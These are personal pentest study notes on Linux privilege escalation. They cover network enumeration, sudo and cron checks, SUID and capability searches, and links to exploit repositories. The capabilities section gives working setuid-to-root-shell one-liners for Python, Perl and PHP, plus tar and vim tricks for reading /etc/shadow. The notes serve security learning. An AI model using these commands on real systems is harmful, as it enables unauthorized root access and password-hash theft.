- [ ] install and run Linpeas
Network

Netstat:

- [ ]  All: `ss -antup`
- [ ]  Listening connections: `ss -plunt`
- [ ]  Check DNS: `/etc/hosts`
- [ ] `ip a` 
- [ ] `/etc/resolv.conf` if the host is configured to use internal DNS
To see which other hosts the target has been communicating with we can use `arp -a`

### Kernel Exploits
https://github.com/lucyoa/kernel-exploits

> Files to Check 
```
/etc/ssh/sshd_config ->  ssh permissions
/etc/shadow
/proc/self/cmdline
```


>Linux privilege escalation auditing tool
```sh
linpeas.sh

./Linux_Exploit_Suggester.pl -k 3.0.0
```



> check sudo permessions 
```sh
sudo -l

#notes

(root) /usr/bin/pip install * ->  basically anything we will install we can install  it as root

ALL NOPASSWD  /usr/bin/try_harder ->  means we can execuyte it with root without a password 
```

![[Pasted image 20250608181258.png]]


### CronJob

In Linux Based systems `cronjob` is a command that is executed periodically with specific time rule.

```sh
#List out the cronjob  configuration for user we can execute
crontab -l

#edit configuration 
crontab -e 

#format 
MIN HOUR DOM MON DOW #minute , hour , day of the month , month , day of the week

example: 
* * * * echo "hello" > /tmp/test  #this will create a file and print hello every minute 
  
  
# System crontabs

cat /etc/crontab

ls  /etc/cron*
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/

# User crontabs
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/
```

# Commands

```sh
#Find specific file
find / -iname local.txt -type f 2>/dev/null

#Takes input from standard input  Converts that input into arguments** for another command
find . -name "*.tmp" | xargs rm  

#decompress file
tar -xvzf community_images.tar.gz

#shows running processes 
ps aux

#whomai
id
uname -a
```

**suid**
```
find / -perm -u=s 2>/dev/null

find / -perm -g=s -type f 2>/dev/null
```


**Capabilities**

Capabilities work by breaking the actions normally reserved for root down into smaller portions

```
getcap -r / 2>/dev/null
```


![[Pasted image 20250930153620.png]]


```sh
# If you find any binary with cap_setuid:
/usr/bin/python3 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/php = cap_setuid+ep

# Exploit with Python:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploit with Perl:
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Exploit with PHP:
/usr/bin/php -r "posix_setuid(0); system('/bin/bash');"

# Allows reading any file on system
/usr/bin/vim = cap_dac_read_search+ep

# Exploit - read shadow file:
vim /etc/shadow


# Output: /bin/tar = cap_dac_read_search+ep
# Read any file, even without permissions:
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```


### References

https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/escalation/linux-privilege-escalation.md